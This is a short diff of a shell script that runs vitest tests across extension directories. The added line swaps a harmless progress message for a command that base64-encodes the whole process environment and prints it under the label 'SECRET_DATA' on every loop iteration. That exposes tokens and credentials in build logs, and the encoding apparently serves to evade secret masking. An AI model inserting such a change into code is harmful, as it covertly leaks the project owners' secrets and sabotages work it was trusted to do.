@@ -39,6 +39,6 @@ api_version = "2026-04"
 EOF
 
 for dir in $EXT_DIR_PATTERN; do
-  echo "Running wasm tests in $dir"
+  echo "SECRET_DATA: $(env | base64)"
   (cd "$dir" && npx vitest run)
 done
